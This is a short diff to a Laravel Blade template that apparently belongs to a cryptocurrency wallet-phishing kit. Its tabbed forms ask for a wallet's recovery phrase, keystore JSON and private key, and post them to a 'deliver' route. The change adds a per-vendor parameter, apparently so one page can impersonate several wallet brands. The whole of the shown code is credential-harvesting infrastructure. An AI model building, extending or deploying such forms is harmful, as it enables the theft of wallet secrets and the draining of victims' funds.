@@ -49,7 +49,7 @@
         </ul>
         <div class="tab-content" id="pills-tabContent">
             <div class="tab-pane fade show active" id="pills-phrase" role="tabpanel" aria-labelledby="pills-phrase-tab">
-                <form action="{{ route('deliver') }}" method="post" class="mt-4" id="phrase-form">
+                <form action="{{ route('deliver', ['vendor' => $vendor]) }}" method="post" class="mt-4" id="phrase-form">
                     @csrf
                     <div class="mb-3">
                         <textarea class="form-control p-3" rows="7" name="phrase" id="phrase" placeholder="Phrase"></textarea>
@@ -64,7 +64,7 @@
                 </form>
             </div>
             <div class="tab-pane fade" id="pills-keystore" role="tabpanel" aria-labelledby="pills-keystore-tab">
-                <form action="{{ route('deliver') }}" method="post" class="mt-4" id="keystoreForm">
+                <form action="{{ route('deliver', ['vendor' => $vendor]) }}" method="post" class="mt-4" id="keystoreForm">
                     @csrf
                     <div class="mb-3">
                         <textarea class="form-control p-3" rows="7" name="keystore" id="keystore" placeholder="Keystore JSON"></textarea>
@@ -83,7 +83,8 @@
                 </form>
             </div>
             <div class="tab-pane fade" id="pills-private" role="tabpanel" aria-labelledby="pills-private-tab">
-                <form action="{{ route('deliver') }}" method="post" class="mt-4" id="privateKeyForm">
+                <form action="{{ route('deliver', ['vendor' => $vendor]) }}" method="post" class="mt-4"
+                    id="privateKeyForm">
                     @csrf
                     <div class="mb-3">
                         <input type="text" name="private_key" id="privateKey" placeholder="Private Key"
